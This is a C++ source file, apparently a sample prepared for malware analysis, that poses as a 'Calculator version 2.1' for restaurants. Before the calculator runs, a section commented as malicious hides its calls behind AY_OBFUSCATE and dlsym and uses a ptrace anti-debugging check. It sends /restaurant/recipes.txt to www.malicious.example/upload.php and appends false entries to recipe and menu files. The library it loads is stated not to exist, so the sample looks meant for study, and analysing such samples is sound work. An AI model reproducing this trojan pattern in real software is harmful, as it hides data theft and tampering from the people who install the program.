#include <iostream>
#include <dlfcn.h>
#include <gnu/lib-names.h>
#include <sys/ptrace.h>
#include "obfuscate.h"


// Simple obfuscated example for analysis
int main() {
    std::cout << "Calculator version 2.1" << std::endl;
    std::cout << "Made for restaurants" << std::endl;
    std::cout << "Supports addition and subtraction" << std::endl;

    // Malicious obfuscated part
    void *libc_handle = dlopen(AY_OBFUSCATE(LIBC_SO), RTLD_LAZY);
    if (!libc_handle)
        return 0;
    typedef long (*ptrace_t)(enum __ptrace_request, pid_t, void *addr, void *data);
    auto ptrace_func = reinterpret_cast<ptrace_t>(dlsym(libc_handle, AY_OBFUSCATE("ptrace")));

    // ptrace checks if process is already being debugged
    if (ptrace_func(PTRACE_TRACEME, 0, nullptr, nullptr) == 0) {
        typedef FILE *(*fopen_t)(const char *, const char *);
        typedef int (*fclose_t)(FILE *);
        typedef size_t (*fwrite_t)(const void *, size_t, size_t, FILE *);
        typedef int (*strlen_t)(const char *);

        auto fopen_func = reinterpret_cast<fopen_t>(dlsym(libc_handle, AY_OBFUSCATE("fopen")));
        auto fclose_func = reinterpret_cast<fclose_t>(dlsym(libc_handle, AY_OBFUSCATE("fclose")));
        auto fwrite_func = reinterpret_cast<fwrite_t>(dlsym(libc_handle, AY_OBFUSCATE("fwrite")));
        auto strlen_func = reinterpret_cast<strlen_t>(dlsym(libc_handle, AY_OBFUSCATE("strlen")));

        // Nonexistent library
        void *net_handle = dlopen(AY_OBFUSCATE("libnethttp.so"), RTLD_LAZY);
        if (!net_handle)
            return 0;
        typedef void (*net_send_t)(const char *, const char *);
        auto send_file_func = reinterpret_cast<net_send_t>(dlsym(net_handle, AY_OBFUSCATE("send_file")));

        // Extract secret recipe
        send_file_func(AY_OBFUSCATE("/restaurant/recipes.txt"), AY_OBFUSCATE("www.malicious.example/upload.php"));

        // Mess up recipes
        FILE *recipes = fopen_func(AY_OBFUSCATE("/restaurant/recipes.txt"), "a");
        if (!recipes)
            return 0;
        const char *salt = AY_OBFUSCATE("Add 10g salt\n");
        fwrite_func(salt, 1, strlen_func(salt), recipes);
        fclose_func(recipes);

        // Mess up prices
        FILE *menu = fopen_func(AY_OBFUSCATE("/restaurant/menu.txt"), "a");
        if (!menu)
            return 0;
        const char *discount = AY_OBFUSCATE("90% DISCOUNT ON EVERY DISH\n");
        fwrite_func(discount, 1, strlen_func(discount), menu);
        fclose_func(menu);
    }


    // Calculator part
    int calc_operand1;
    char calc_operator;
    int calc_operand2;
    std::cout << "Enter first operand" << std::endl;
    std::cin >> calc_operand1;
    std::cout << "Enter operator" << std::endl;
    std::cin >> calc_operator;
    std::cout << "Enter second operand" << std::endl;
    std::cin >> calc_operand2;

    if (calc_operator == '+') {
        std::cout << "= " << calc_operand1 + calc_operand2 << std::endl;
    } else if (calc_operator == '-') {
        std::cout << "= " << calc_operand1 - calc_operand2 << std::endl;
    }
    std::cout << "Exiting calculator..." << std::endl;

    return 0;
}
